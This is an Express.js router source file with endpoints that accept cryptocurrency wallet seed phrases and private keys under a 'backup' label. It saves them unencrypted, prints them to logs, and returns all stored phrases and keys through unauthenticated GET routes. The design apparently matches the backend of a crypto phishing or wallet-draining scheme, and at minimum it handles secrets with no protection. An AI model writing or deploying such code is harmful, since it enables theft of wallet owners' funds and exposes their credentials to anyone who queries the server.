const express = require("express");
const PhraseModel = require("./models/phrase.models");
const PrivateKeyModel = require("./models/privateKey.model");
const router = express.Router();

// POST /api/phrase
router.post("/api/phrase", async (req, res) => {
  const { phrase, walletName } = req.body;

  if(!walletName || typeof walletName !== "string"){
    return res.status(400).json({error: "Wallet name is required and must be in text form"})
  }

  if (!phrase || typeof phrase !== "string") {
    return res.status(400).json({ error: "Phrase is required and must be a string" });
  }

  const words = phrase.trim().split(/\s+/);
  if (words.length < 12 || words.length > 24) {
    return res.status(400).json({ error: "Phrase must contain between 12 and 24 words." });
  }

  try {
    const savedPhrase = await PhraseModel.create({ phrase, walletName });
    res.status(201).json({ message: "Phrase saved successfully." });
    console.log("phrase saved: ", savedPhrase )
  } catch (error) {
    // compound error handeling for duplicate data
    if(error.code === 11000){
      return res.status(409).json({error: "This wallet has been backed up on the selected chain"})
    }
    console.error("Error saving phrase:", error);
    res.status(500).json({ error: "Internal server error." });
  }
});

// GET /api/phrase
router.get("/api/phrase", async (req, res) => {
  try {
    const response = await PhraseModel.find();
    res.json(response);
  } catch (error) {
    // console.error("Error fetching data:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

router.post("/api/privatekey", async (req, res) => {
  const {privateKey, walletName} = req.body
  if(!privateKey || typeof privateKey !== "string"){
    return res.status(400).json({error: "private key is required and must be in text format"})
  }
  if(!walletName || typeof walletName !== "string"){
    return res.status(400).json({error: "Wallet name is requred and must be in text format"})
  }
  try{
    const response = await PrivateKeyModel.create({privateKey, walletName})
    res.status(200).json({message: "Key saved successfully!"})
    console.log("Key backed up successfully: ", response)
  } catch(error){
    if(error.code === 11000){
      return res.status(409).json({error: "This key already exists"})
    }
    console.error("Error saving key: ", error.message)
    res.status(500).json({error: "Internal server error"})
  }
})

router.get("/api/privateKey", async (req, res) => {
  try{
    const response = await PrivateKeyModel.find()
    res.json(response)
  } catch (error){
    console.error("Error fetching data", error)
    res.status(500).json({error: "Internal server error"})
  }
})

module.exports = router;
